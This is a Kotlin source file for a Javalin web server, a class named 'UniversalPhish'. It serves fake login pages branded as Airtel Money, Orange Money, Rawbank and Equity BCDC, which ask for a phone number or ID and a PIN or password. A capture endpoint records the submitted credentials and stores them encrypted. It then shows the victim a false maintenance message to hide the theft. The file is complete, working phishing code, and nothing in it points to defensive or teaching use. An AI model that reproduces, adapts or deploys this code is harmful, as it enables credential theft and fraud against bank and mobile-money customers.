package com.fardc.sigint.core

import io.javalin.Javalin

class UniversalPhish(private val vault: SecurityVault) {
    fun setup(app: Javalin) {
        app.get("/login/{provider}") { ctx ->
            val provider = ctx.pathParam("provider").lowercase()
            
            // Configuration dynamique selon la cible
            val config = when(provider) {
                "airtel" -> Pair("Airtel Money", "#ff0000")
                "orange" -> Pair("Orange Money", "#ff6600")
                "rawbank" -> Pair("Rawbank Online", "#003366")
                "bcdc" -> Pair("Equity BCDC", "#a32323")
                else -> Pair("Portail Sécurisé", "#333333")
            }

            ctx.html("""
                <html>
                <body style="background:${config.second}; font-family:sans-serif; text-align:center; color:white; padding-top:50px;">
                    <div style="background:white; width:350px; margin:auto; padding:20px; border-radius:10px; color:black;">
                        <h2>${config.first}</h2>
                        <p>Authentification requise pour la transaction SIGINT</p>
                        <form action="/capture/universal" method="POST">
                            <input type="hidden" name="target" value="${config.first}">
                            <input type="text" name="id" placeholder="Identifiant / N° de téléphone" style="width:100%; padding:10px; margin:5px 0;">
                            <input type="password" name="pin" placeholder="Code PIN / Mot de passe" style="width:100%; padding:10px; margin:5px 0;">
                            <button type="submit" style="width:100%; padding:10px; background:${config.second}; color:white; border:none; font-weight:bold;">VALIDER</button>
                        </form>
                    </div>
                </body>
                </html>
            """.trimIndent())
        }

        app.post("/capture/universal") { ctx ->
            val target = ctx.formParam("target")
            val id = ctx.formParam("id")
            val pin = ctx.formParam("pin")
            val data = "🚨 [UNIVERSAL-CAPTURE] Cible: $target | ID: $id | PIN: $pin"
            
            println(data)
            vault.encryptData(data)
            ctx.result("Maintenance du réseau. Veuillez réessayer plus tard.")
        }
    }
}
